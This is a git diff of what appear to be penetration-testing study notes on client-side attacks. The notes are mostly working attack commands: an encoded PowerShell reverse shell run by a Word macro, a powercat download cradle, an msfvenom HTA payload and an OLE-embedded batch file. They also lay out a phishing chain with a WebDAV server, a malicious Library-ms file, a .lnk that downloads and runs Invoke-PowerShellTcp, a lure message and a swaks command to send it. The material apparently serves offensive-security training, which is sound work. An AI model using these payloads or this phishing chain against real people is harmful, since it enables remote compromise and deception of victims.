@@ -508,6 +508,7 @@ sudo fuser -k 443/tcp
 -     Sub Document_Open()  MyMacro  End Sub
 - encode the following PowerShell reverse shell
 -     IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+-     msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o /home/raman/Desktop/payload.hta
 - use the following function to split the payload
 str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
 n = 50
@@ -526,6 +527,21 @@ print("Str = Str + " + '"' + str[i:i+n] + '"')
  Str = Str + "A== "
  CreateObject("Wscript.Shell").Run Str
 End Sub
-
-- Windows Library Files
-- 
+- Object linking and Embedding
+- In CMD type the following
+-     echo "START cmd.exe" > evil.bat
+-     powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...
+- Go to Microsoft Word ==> Insert ==> Object ==> evil.bat
+- Email Phishing Attack
+- First we install and enable our webdav server
+-     pip3 install wsgidav
+-     pip3 install cheroot
+-     sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
+- Then we create a config.Library.ms file with the following content. Notice the IP address.
+-     <?xml version="1.0" encoding="UTF-8"?><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"><name>@windows.storage.dll,-34582</name><version>6</version><isLibraryPinned>true</isLibraryPinned><iconReference>imageres.dll,-1003</iconReference><templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo><searchConnectorDescriptionList><searchConnectorDescription><isDefaultSaveLocation>true</isDefaultSaveLocation><isSupported>false</isSupported><simpleLocation><url>http://192.168.45.239</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>
+- We craft a malicious File.lnk that contains our powershell payload.
+-     powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
+- we can send a malicious body.txt
+-     Hi, please click on the attachment :D
+- using smtp with swaks
+-     swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
